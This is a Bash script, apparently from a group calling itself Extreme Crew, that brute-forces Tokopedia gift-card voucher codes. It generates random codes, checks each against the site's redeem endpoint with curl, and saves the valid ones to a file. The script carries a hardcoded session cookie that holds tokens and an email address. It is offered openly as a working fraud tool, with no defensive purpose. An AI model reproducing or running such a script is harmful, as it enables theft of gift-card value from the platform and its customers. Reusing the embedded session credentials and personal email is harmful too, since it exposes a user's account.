#Coded By AchonkJust - Extreme Crew
#issued 07-Mar-2018
#ToloPedia Extrap auto redeem voucher
#Update!!
#!/bin/bash/sh
putih='\033[0m'
ijo='\e[38;5;82m'
merah='\e[38;5;196m'
 header(){
printf "${ijo}"
printf "     ___        __                _____ _____ _____   _       ________    \n"
printf "    /   | _____/ /_  ____  ____  / ___// ___// ___/  (_)_  __/ ____/ /_   \n"
printf "   / /| |/ ___/ __ \/ __ \/ __ \/ __ \/ __ \/ __ \  / / / / /___ \/ __/   \n"
printf "  / ___ / /__/ / / / /_/ / / / / /_/ / /_/ / /_/ / / / /_/ /___/ / /_     \n"
printf " /_/  |_\___/_/ /_/\____/_/ /_/\____/\____/\____/_/ /\__,_/_____/\__/     \n"
printf "==========ToloPedia Extrap Voucher=============/___/ By Extreme.Crew 	  \n"
}
rm -f extreme.crew
clear
header
if [ ! $1 ];then
echo "1 Akun Max 10 kali generate"
echo "Usage : $0 <jumlah generate>"
echo "EX : $0 10"
exit
fi
#Edit Your Cookies Here
ngelog(){
cok="_gorilla_csrf=MTUyNDQ3NzE5OHxJbWd5VVc1M2MyUXJhSGRYTDBoSmFWRkxNblZ4Y1RoS2FsQlJVek5TZGtOSWNHRXlNaXRtY1hBeFJuYzlJZ289fGfMP71Oee4vgLlYkFQbXbQAmqGyZe2NyS5SRX2Z7oFK; _BID_TOKOPEDIA_=270b50252c10cc87501fd0002072f346; insUserData=%7B%22email%22%3A%22satriaalam%40india2in.com%22%7D; __sonar=13700573554755992968; state=eyJsZCI6Imh0dHBzOi8vYWNjb3VudHMudG9rb3BlZGlhLmNvbS90aGFua3M_dGhlbWU9ZGVmYXVsdFx1MDAyNmxkPVx1MDAyNmFjdGl2YXRpb25fdHlwZT01IiwicmVmIjoiaHR0cHM6Ly93d3cudG9rb3BlZGlhLmNvbSIsInV1aWQiOiJkODVhNjM2OC1kOTNkLTQ3YjAtYmI1MC0wN2U1MzQyNTRkM2QiLCJ0aGVtZSI6ImRlZmF1bHQifQ; l=1; _dc_gtm_UA-9801603-1=1; ins-gaSSId=683bac99-0081-b6f7-6af2-b2f089ccf42a_1524480698; scs=%7B%22t%22%3A1%7D; insdrSV=4; _ID_autocomplete_=81765a0a30eb4e0899711fe0bcf4d666; o_Pulsa=eyJsYXN0X2RlY2xpbmUiOiIiLCJyZWZlcnJlciI6Imh0dHBzOi8vcHVsc2EudG9rb3BlZGlhLmNvbS9naWZ0LWNhcmQvdG9rb3BlZGlhL3JlZGVlbS8iLCJpc19taWNyb3NpdGUiOmZhbHNlLCJ1dWlkIjoiZGRmNGE1OGYtN2UzNy00MjQ5LWIzMGQtMGU4NGUzYzQ3NjMwIiwiaXNfYWpheCI6dHJ1ZX0; pulsa-aff=undefined; _dc_gtm_UA-9801603-23=1; _uetsid=_uet2398da22; _ga=GA1.2.1025817270.1524477094; _gid=GA1.2.902527987.1524477094; _SID_Tokopedia_=MVLOHhiTRAwIzXD4qimzgg-QE2GSRyHP323AJ2_ewyGJz4eBWG3ZVIrEfCUIqhfi3oULm7D5SlTxN6S3iAmhRmKirWTzVucyTwNMuNh4I1qPI3tKtIcbrrgCQCD-TsXc; _ampSES=8f33ffb968SESc2eed37a5d40-30798-1524477173514; _ampUITN=698ed28f0ebot2074e3c391a0-30798-1524477173517; _ampNV=0; _ampRV=1; _ampCon=Canada; _ampCity=Montreal"
	curl -s -X GET \
--url "https://pulsa.tokopedia.com/gift-card/tokopedia/redeem/check?voucher_code=FPL$1" \
-H "accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8" \
-H "accept-encoding: gzip, deflate, br" \
-H "cookie: $cok" \
-H "accept-language: en-US,en;q=0.9" \
-H "cache-control: max-age=0" \
-H "upgrade-insecure-requests: 1" \
-H "user-agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTssML, like Gecko) Ubuntu Chromium/65.0.3325.181 Chrome/65.0.3325.181 Safari/537.36"
}

for generate in $(cat /dev/urandom | tr -dc 'A-Z0-9' | fold -w 13 | head -n 10); do
	ngegas=$(ngelog $generate | grep -Po "(?<=\"message\":\").*?(?=\"\,\")")
	if [[ "$ngegas" ]]; then
		echo "$ngegas"
		echo "[-$ngegas-] $generate" >> tokopedia.txt
	fi
done
rm -f extreme.crew
